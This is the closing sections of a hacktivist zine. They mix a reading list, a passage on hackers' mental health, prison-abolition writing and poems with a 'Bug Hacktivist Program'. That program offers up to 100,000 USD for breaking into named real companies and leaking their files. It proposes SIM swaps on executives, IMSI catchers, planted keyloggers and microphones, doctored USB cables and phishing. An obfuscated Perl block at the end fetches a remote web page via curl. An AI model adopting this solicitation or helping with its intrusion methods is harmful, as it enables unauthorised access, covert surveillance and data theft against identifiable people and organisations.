+Almost all hacking today is done by black hat hackers, for personal gain; or for white hat hackers, for the benefit of the shareholders (and in defense of the banks, companies and states that are annihilating us and the planet in which we live); and by military and intelligence agencies, as part of their war and conflict agenda. Seeing that this our world is already at the limit, I have thought that, in addition to these technical tips for learning to hack, I should include some resources that have been very important for my development and have guided me in the use of my hacking knowledge.
+* Ami: El Niño de las Estrellas – Enrique Barrios
+* La Anarquía Funciona: https://es.theanarchistlibrary.org/library/peter-gelderloos-la-anarquia-funciona
+* Viviendo Mi Vida – Emma Goldman
+* The Rise and Fall of Jeremy Hammond, Enemy of the State: https://www.rollingstone.com/culture/culture-news/the-rise-and-fall-of-jeremy-hammond-enemy-of-the-state-183599/
+Este cuate y el hack de HBGary fueron una inspiración
+* Días de Guerra, Noches de Amor – Crimethinc
+* Momo – Michael Ende
+* Cartas a un joven poeta – Rilke
+* Dominion (Documentary)
+"We cannot believe that, if we do not look, what we do not want to see will not happen"
+- Tolstoy in Первая ступень
+Bash Back!
+[13 - Heal]
+The hacker world has a high incidence of depression, suicides and certain battles with mental health. I don't think it's because of hacking, but because of the kind of environment that hackers mostly come from. Like many hackers, I grew up with little human contact: I was a girl raised by the internet. I have my struggles with depression and emotional numbness. Willie Sutton is frequently quoted as saying that he robbed banks because "that's where the money is," but the quote is incorrect. What he really said was:
+Why did I rob banks? Because I enjoyed it. I loved to do it. I was more alive when I was inside a bank, in full robbery, than at any other time in my life. I enjoyed it so much that one or two weeks later I was already looking for the next opportunity. But for me money was a minutiae, nothing more.
+Hacking has made me feel alive. It started as a way to self-medicate depression. Later I realized that, in reality, I could do something positive. I don't regret the way I grew up at all, it brought several beautiful experiences to my life. But I knew I couldn't continue living that way. So I began to spend more time away from my computer, with other people, learning to open myself to the world, to feel my emotions, to connect with others, to accept risks and be vulnerable. Things much harder than hacking, but at the mere hour the reward is more worth it. It is still an effort, but even if it is slow and wobbly, I feel that I am on my way.
+Hacking, done with conscience, can also be what heals us. According to Mayan wisdom, we have a gift granted by nature, which we must understand to put it at the service of the community. In [1], it is explained:
+When a person does not accept his job or mission he begins to suffer from seemingly incurable diseases; although he does not die in a short time, but only suffers, in order to wake up or become aware. That is why it is essential that a person who has acquired the knowledge and does his work in the communities must pay his Toj and maintain constant communication with the Creator and his ruwäch q’ij, since he constantly needs their strength and energy. Otherwise, the diseases that caused him to react or take the job could cause damage again.
+If you feel that hacking is feeding your isolation, depression, or other conditions, breathe. Give yourself some time to meet and become aware. You deserve to live happily, with health and fullness.
+________________________
+< All Cows Are Beautiful >
+ ------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+          `'
+[1] Ruxe’el mayab’ K’aslemäl: Raíz y espíritu del conocimiento maya
+https://www.url.edu.gt/publicacionesurl/FileCS.ashx?Id=41748
+[14 - The Bug Hacktivist Program]
+It seems to me that hacking to get and leak documents of public interest is one of the best ways in which hackers can use their skills for the benefit of society. Unfortunately for us hackers, as in almost every category, the perverse incentives of our economic system do not coincide with what benefits society. So this program is my attempt to make it possible for good hackers to earn a living in an honest way by revealing material of public interest, instead of having to go selling their work to the cybersecurity, cybercrime or business industries. Cyberwar Some examples of companies whose leaks I would love to pay for are:
+- the mining, logging and livestock companies that plunder our beautiful Latin America (and kill land and territory defenders trying to stop them)
+- companies involved in attacks on Rojava such as Baykar Makina or Havelsan
+- surveillance companies such as the NSO group
+- war criminals and birds of prey such as Blackwater and Halliburton
+- private penitentiary companies such as GeoGroup and CoreCivic / CCA, and corporate lobbyists such as ALEC
+Pay attention when choosing where to investigate. For example, it is well known that oil companies are evil: they get rich at the cost of destroying the planet (and back in the 80s the companies themselves already knew about the consequences of their activity [1]). But if you hack them directly, you will have to dive into an incredible amount of boring information about your daily operations. Very likely it will be much easier for you to find something interesting if instead you focus on your lobbyists [2]. Another way to select viable goals is to read stories of investigative journalists (such as [3]), which are interesting but lack solid evidence. And that is exactly what your hacks can find.
+I will pay up to 100 thousand USD for each filtration of this type, according to the public interest and impact of the material, and the labor required in the hacking. Needless to say, a complete leak of the documents and internal communications of any of these companies will be a benefit for society that exceeds those one hundred thousand, but I am not trying to enrich anyone. I just want to provide enough funds so that hackers can earn a decent living doing a good job. Due to time constraints and safety considerations I will not open the material, nor inspect it for myself, but I will read what the press says about it once it has been published, and I will make an estimate of the public interest from there. My contact information is at the end of the guide mentioned above [4].
+How you get the material is your thing. You can use the traditional hacking techniques outlined in this guide and the previous one [4]. You could do a sim swap [5] on a corrupt businessman or politician, and then download his emails and backups from the cloud. You can order an IMSI catcher from alibaba and use it outside its offices. You can do some war-driving (the old way or the new [6]). You may be a person within your organizations that already has access. You can opt for a low-tech old-school style like in [7] and [8], and simply sneak into their offices. Whatever works for you.
+[1] https://www.theguardian.com/environment/climate-consensus-97-per-cent/2018/sep/19/shell-and-exxons-secret-1980s-climate-change-warnings
+[2] https://theintercept.com/2019/08/19/oil-lobby-pipeline-protests/
+[3] https://www.bloomberg.com/features/2016-como-manipular-una-eleccion/
+[4] https://www.exploit-db.com/papers/41914
+[5] https://www.vice.com/en_us/article/vbqax3/hackers-sim-swapping-steal-phone-numbers-instagram-bitcoin
+[6] https://blog.rapid7.com/2019/09/05/this-one-time-on-a-pen-test-your-mouse-is-my-keyboard/
+[7] https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI
+[8] https://en.wikipedia.org/wiki/Unnecessary_Fuss
+[14.1 - Partial payments]
+Are you a good-hearted waitress working in a company of evil [1]? Would you be willing to sneak a physical keylogger into an executive's computer, change your USB charging cable for a modified one [2], hide a microphone in a meeting room where you plan your atrocities, or leave one of these [5] forgotten in some corner of the offices?
+[1] https://en.wikipedia.org/wiki/Evil_maid_attack
+[2] http://mg.lol/blog/defcon-2019/
+[3] https://shop.hak5.org/products/lan-turtle
+Are you good with social engineering and phishing, and did you get a shell on an employee's computer, or did you get your vpn credentials using phishing? But maybe you couldn't get domain admin and download what you wanted?
+Did you participate in bug bounties programs and become an expert in web application hacking, but don't have enough hacker experience to completely penetrate the company?
+Do you have facility with reverse engineering? Scan some evil companies to see what devices they have exposed to the internet (firewall, VPN, and email gateways will be much more useful than things like IP cameras), apply reverse engineering and find some exploitable vulnerability remotely.
+If I can work with you to penetrate the company and get material of public interest, you will also be rewarded for your work. If I don't have the time to work on it myself, at least I will try to advise you on how to continue until you can complete the hacking on your own.
+Supporting those in power to hack and monitor dissidents, activists and the general population is today an industry of several billion dollars, while hacking and exposing those in power is a voluntary and risky job. Turning it into a multi-million dollar industry will certainly not fix that power imbalance, nor will it solve the problems.
+More of society. But I think it will be fun. So ... I want to see people starting to collect their rewards!
+[15 - Abolish prisons]
+Built by the enemy to enclose ideas
+enclosing companions to silence war cries
+it is the center of torture and annihilation
+where the human being becomes more violent
+It is the reflection of society, repressive and prison
+sustained and based on authoritarian logic
+repressed and guarded custodians
+thousands of dams and prisoners are exterminated
+before this schizophrenic and ruthless machine
+companion Axel Osorio giving the strip in the cane
+breaking the isolation and silencing
+fire and war to jail, we are destroying!
+Rap Insurgent - Words In Conflict
+It would be typical to end a hacker zine saying release hammond, release manning, release hamza, release detainees by mounting the дело Сети, etc. I am going to take this tradition to its most radical consequence[1], and to say: we must abolish prisons now! Being a criminal myself, they may think that what happens is that I have a slightly skewed view of the matter. But seriously, it is not even a controversial issue, even the UN almost agrees [2]. So, once and for all, free migrants [3][4][5][6], often imprisoned by those same countries that created the war and the environmental and economic destruction they are fleeing from. Free all those in prison because of the war against those who use drugs [7]. Free all people imprisoned in the war against the poor [8]. All the prisons is hide and ignore the proof of the existence of social problems, instead of fixing them. And until everyone is released, fight the prison system by remembering and keeping in mind those who are trapped in there. Send them honey, letters, helicopters [9], pirate radios [10] and books, and support those who organize from there with [11][12].
+[1] http://www.bibliotecafragmentada.org/wp-content/uploads/2017/12/Davis-Son-obsoletas-las-prisiones-final.pdf
+[2] https://www.unodc.org/pdf/criminal_justice/Handbook_of_Basic_Principles_and_Promising_Practices_on_Alternatives_to_Imprisonment.pdf
+[3] https://www.theguardian.com/us-news/2016/dec/21/us-immigration-detention-center-christmas-santa-wish-list
+[4] https://www.theguardian.com/us-news/2016/aug/18/us-border-patrol-facility-images-tucson-arizona
+[5] https://www.playgroundmag.net/now/detras-Centros-Internamiento-Extranjeros-Espana_22648665.html
+[6] https://www.nytimes.com/2019/06/26/world/australia/australia-manus-suicide.html
+[7] https://en.wikiquote.org/wiki/John_Ehrlichman#Quotes
+[8] VI, 2. i. The Unpaid Fine: https://scielo.conicyt.cl/scielo.php?script=sci_arttext&pid=S0718-00122012000100005
+[9] p. 10, Libel Nº2. Political bulletin from the High Security Prison
+[10] https://itsgoingdown.org/transmissions-hostile-territory/
+[11] https://freealabamamovement.wordpress.com/f-a-m-pamphlet-who-we-are/
+[12] https://incarceratedworkers.org/
+[16 - Conclusion]
+Our world is upside down [1]. We have a justice system that represents injustice. The law and order are there to create an illusion of social peace, and hide the systematic and profound exploitation, violence, and injustice. Better follow your conscience, and not the law.
+[1] http://resistir.info/livros/galeano_patas_arriba.pdf
+Businessmen enrich themselves by mistreating people and the planet, while care work is largely unpaid. Through the assault on everything communal, we have somehow raised densely populated cities, plagued by loneliness and isolation. The cultural, political and economic system in which we live encourages the worst facets of human nature: greed, selfishness and self-centeredness, competitiveness, lack of compassion and attachment to authority. So, for those who have managed to remain sensitive and compassionate in a cold world, for all the everyday heroines that practice goodness in small things, for all of you who still have a star burning in your hearts: гоpи, гоpи ясно, чтобы не погасло!
+           _____________________
+          <Let's sing together! >
+           ---------------------
+                  \
+                    \ ^__^
+                      (oo)\_______
+                   (  (__)\       )\/\
+                    _) /  ||----w |
+                   (.)/   ||     ||
+                       Open heart
+                     Open feeling
+                   Open understanding
+                   Leave reason aside
+         And let the sun hidden inside you shine
+perl -Mre=eval <<\EOF
+                                       ''                                    
+                                      =~(                                    
+                                      '(?'                                    
+                                     .'{'.(                                  
+                                    '`'|'%'                                  
+                                    ).("\["^                                  
+                                   '-').('`'|                                
+                                  '!').("\`"|                                
+                                  ',').'"(\\$'                                
+                                 .':=`'.(('`')|                              
+                                '#').('['^'.').                              
+                                ('['^')').("\`"|                              
+     ',').('{'^'[').'-'.('['^'(').('{'^'[').('`'|'(').('['^'/').('['^'/').(  
+    '['^'+').('['^'(').'://'.('`'|'%').('`'|'.').('`'|',').('`'|'!').("\`"|  
+      '#').('`'|'%').('['^'!').('`'|'!').('['^'+').('`'|'!').('['^"\/").(    
+         '`'|')').('['^'(').('['^'/').('`'|'!').'.'.('`'|'%').('['^'!')      
+            .('`'|',').('`'|'.').'.'.('`'|'/').('['^')').('`'|"\'").          
+              '.'.('`'|'-').('['^'#').'/'.('['^'(').('`'|('$')).(            
+                 '['^'(').('`'|',').'-'.('`'|'%').('['^('(')).                
+                    '/`)=~'.('['^'(').'|</'.('['^'+').'>|\\'                  
+                       .'\\'.('`'|'.').'|'.('`'|"'").';'.                    
+                         '\\$:=~'.('['^'(').'/<.*?>//'                        
+                         .('`'|"'").';'.('['^'+').('['^                      
+                        ')').('`'|')').('`'|'.').(('[')^                      
+                       '/').('{'^'[').'\\$:=~/('.(('{')^                      
+                       '(').('`'^'%').('{'^'#').('{'^'/')                    
+                      .('`'^'!').'.*?'.('`'^'-').('`'|'%')                    
+                     .('['^'#').("\`"|    ')').('`'|'#').(                    
+                     '`'|'!').('`'|          '.').('`'|'/')                  
+                    .'..)/'.('['               ^'(').'"})')                  
+                    ;$:="\."^                     '~';$~='@'                  
+                   |'(';$^=                          ')'^'[';                
+                  $/='`'                                |'.';                
+                  $,=                                      '('          
+EOF
+        We were born at night.
+        We live in it, we hack in it.
+       
+        Here we are, we are the rebel dignity,
+        the forgotten heart of the Интернет.
+       
+        Our fight is for memory and justice,
+        and the bad government is filled with criminals and murderers.
+       
+        Our fight is for fair and decent work,
+        and bad government and corporations buy and sell zero days.
+        For all tomorrow.
+        For us the happy rebellion of the leaks
+        and expropriation.
+        For all everything.
+        For us nothing.
+        From the mountains of the Cyber Southeast,
+       _   _            _      ____             _    _
+       | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
+       | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
+       |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
+       |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
